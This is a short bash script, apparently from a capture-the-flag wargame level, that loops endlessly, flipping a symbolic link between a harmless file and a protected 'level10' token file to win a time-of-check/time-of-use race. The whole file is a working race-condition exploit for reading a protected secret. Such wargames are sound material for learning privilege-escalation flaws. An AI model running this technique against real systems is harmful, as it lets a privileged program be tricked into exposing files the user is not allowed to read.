#!/bin/bash

while true; do
  # Switch the symbolic link to /tmp/myfile
  ln -sf /tmp/myfile /tmp/linkfile

  # Switch the symbolic link to the token file
  ln -sf /home/user/level10/token /tmp/linkfile
done

